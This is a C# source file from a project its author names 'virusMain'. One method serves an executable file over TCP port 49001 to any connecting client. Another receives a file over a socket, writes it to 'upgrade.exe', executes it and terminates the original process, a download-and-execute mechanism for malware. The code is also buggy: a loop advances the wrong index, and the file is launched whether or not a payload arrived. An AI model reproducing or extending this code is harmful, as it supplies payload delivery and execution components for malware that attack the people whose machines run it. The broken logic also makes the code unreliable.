using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace virusMain
{
    class TcpServer
    {
        public IPAddress give_locale_ip()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var locale_ip in host.AddressList)
            {
                if (locale_ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return locale_ip;
                }
                //return null;
            }
            return null;
        }
        public void sendEXE(string @programm, string ip_str)
        {

            IPAddress ip = IPAddress.Parse(ip_str);

            int port = 49001;

            var tcpEndPoint = new IPEndPoint(ip, port);

            var tcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            tcpSocket.Bind(tcpEndPoint);

            tcpSocket.Listen(100);

            while (true)
            {
                var listener = tcpSocket.Accept();
                var buffer = new byte[256];
                var size = 0;
                var data = new StringBuilder();

                do
                {
                    size = listener.Receive(buffer);
                    data.Append(Encoding.UTF8.GetString(buffer, 0, size));
                } while (listener.Available > 0);

                var answer = File.ReadAllBytes(programm);

                listener.Send(answer);

                listener.Shutdown(SocketShutdown.Both);

                listener.Close();

            }
        }

        public void upgrade()
        {

            var ip = "127.0.0.1"/*give_locale_ip()*/;

            int port = 49001;

            var tcpEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);

            var tcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            tcpSocket.Bind(tcpEndPoint);

            tcpSocket.Listen(100);

            while (true)
            {
                var listener = tcpSocket.Accept();
                var buffer = new byte[256];
                var size = 0;
                StringBuilder data = new StringBuilder();

                do
                {
                    size = listener.Receive(buffer);
                    data.Append(Encoding.UTF8.GetString(buffer, 0, size));
                } while (listener.Available > 0);
                Console.WriteLine(Convert.ToString(data));
                string temp_answ = Convert.ToString(data);

                for (int i = 0; i < temp_answ.Length; i++)
                {
                    switch (temp_answ[i])
                    {
                        case 'U':
                            string temp = "";
                            for (int j = i + 1; i < temp_answ.Length; i++)
                            {
                                temp = temp + temp_answ[j];
                            }
                            long razm = Int64.Parse(temp);

                            buffer = new byte[razm + 5];

                            size = 0;

                            listener.Shutdown(SocketShutdown.Both);
                            listener.Close();


                            listener = tcpSocket.Accept();
                            //tcpSocket.Bind(tcpEndPoint);
                            //tcpSocket.Listen(100);
                            

                            do
                            {
                                size = listener.Receive(buffer);
                                //var answer = buffer;
                            } while (listener.Available > 0);

                            listener.Shutdown(SocketShutdown.Both);
                            listener.Close();

                            string outpath = "upgrade.exe";
                            File.WriteAllBytes(outpath, buffer);
                            break;
                        default:
                            break;
                    }
                }
                Process.Start("upgrade.exe");
                Process.GetCurrentProcess().Kill();
            }
        }
    }
}
